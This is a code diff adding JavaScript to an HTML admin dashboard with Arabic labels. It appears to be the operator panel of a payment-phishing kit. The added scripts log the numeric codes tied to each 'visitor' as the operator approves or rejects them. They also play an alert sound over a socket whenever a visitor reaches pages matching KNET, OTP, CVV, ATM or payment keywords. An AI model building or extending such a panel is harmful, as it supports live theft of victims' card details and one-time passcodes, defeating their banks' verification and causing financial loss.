@@ -4146,5 +4146,94 @@ run();setInterval(function(){note();apply()},1200);})();</script>
 ) draw(); }, 800);
 })();
 </script>
+<script type="text/htmlpreview" id="kddF106">
+/* ===== حفظ الرموز المرفوضة ===== */
+(function(){
+  if (window.__f106a) return; window.__f106a = 1;
+  var LOG = {};
+  try { LOG = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ LOG = {}; }
+  function save(){ try { localStorage.setItem("kdd_rej", JSON.stringify(LOG)); } catch(e){} }
+  function selId(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
+  function vis(id){ var v=null; try { v = visitors.get(id) || null; } catch(e){} if(!v){ try { visitors.forEach(function(x){ if(!v && x && x._id===id) v=x; }); } catch(e){} } return v; }
+  function codeNear(el){
+    var n = el, d = 0;
+    while (n && d < 6){
+      if (n.querySelectorAll){
+        var cs = n.querySelectorAll("span,b,strong,td");
+        for (var i=0;i<cs.length;i++){ var t=(cs[i].textContent||"").trim(); if (/^\d{4,6}$/.test(t)) return t; }
+      }
+      n = n.parentElement; d++;
+    }
+    return null;
+  }
+  document.addEventListener("click", function(e){
+    var b = e.target && e.target.closest ? e.target.closest("button") : null;
+    if (!b) return;
+    var tx = (b.textContent||"").trim();
+    var st = tx.indexOf("رفض") > -1 ? "مرفوض" : (tx.indexOf("موافقة") > -1 ? "مقبول" : null);
+    if (!st) return;
+    var id = selId(); if (!id) return;
+    var code = codeNear(b);
+    if (!code){ try { var v = vis(id); if (v && (v.digitCodes||[]).length) code = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
+    if (!code) return;
+    var arr = LOG[id] || (LOG[id] = []);
+    var last = arr[arr.length-1];
+    if (!(last && last.c === code && last.s === st)){
+      arr.push({ c: code, s: st, t: new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
+      save();
+    }
+    draw();
+  }, true);
+  function draw(){
+    var box = document.getElementById("visitorDetails"); if (!box) return;
+    var id = selId(); if (!id) return;
+    var old = document.getElementById("f106box"); if (old && old.parentNode) old.parentNode.removeChild(old);
+    var arr = LOG[id] || []; if (!arr.length) return;
+    var d = document.createElement("div");
+    d.id = "f106box";
+    d.style.cssText = "border:3px solid #f59e0b;border-radius:14px;padding:12px;margin:10px 0;background:#fffbeb";
+    var h = document.createElement("div");
+    h.style.cssText = "display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:15px;margin-bottom:8px;color:#92400e";
+    var hs = document.createElement("span"); hs.textContent = "🔒 الرموز المرفوضة (محفوظة دائماً)";
+    var cl = document.createElement("button");
+    cl.textContent = "مسح"; cl.style.cssText = "font-size:11px;padding:3px 10px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
+    cl.addEventListener("click", function(){ LOG[id] = []; save(); draw(); });
+    h.appendChild(hs); h.appendChild(cl); d.appendChild(h);
+    for (var i=arr.length-1;i>=0;i--){
+      var r = document.createElement("div");
+      r.style.cssText = "display:flex;justify-content:space-between;font-family:monospace;font-size:16px;padding:5px 0;border-top:1px dashed #e5e7eb";
+      var a = document.createElement("b"); a.textContent = arr[i].c; a.style.color = arr[i].s === "مرفوض" ? "#dc2626" : "#16a34a";
+      var c = document.createElement("span"); c.textContent = arr[i].s + " · " + arr[i].t; c.style.color = "#6b7280";
+      r.appendChild(a); r.appendChild(c); d.appendChild(r);
+    }
+    box.insertBefore(d, box.firstChild);
+  }
+  var orig = window.renderVisitorDetails;
+  if (typeof orig === "function" && !orig.__f106a){
+    var w = function(){ var r = orig.apply(this, arguments); try { draw(); } catch(e){} return r; };
+    w.__f106a = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}
+  }
+  setInterval(function(){ if (!document.getElementById("f106box")) draw(); }, 800);
+})();
+/* ===== صوت الضفدع ===== */
+(function(){
+  if (window.__f106b) return; window.__f106b = 1;
+  function ding(){
+    try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
+    try { new Audio("/admin/frog.mp3").play(); } catch(e){}
+  }
+  var PAY = /ملخص|summary|دفع|كي نت|knet|otp|رمز|cvv|atm|نهائي|final/i;
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f106b) return;
+      s.__f106b = 1;
+      s.on("visitor:pageChanged", function(d){ try { if (PAY.test(String((d&&d.page)||""))) ding(); } catch(e){} });
+      s.on("visitor:dataSubmitted", function(d){ try { if (PAY.test(String((d&&d.data&&d.data.page)||""))) ding(); } catch(e){} });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 500);
+})();
+</script>
 </body>
 </html>
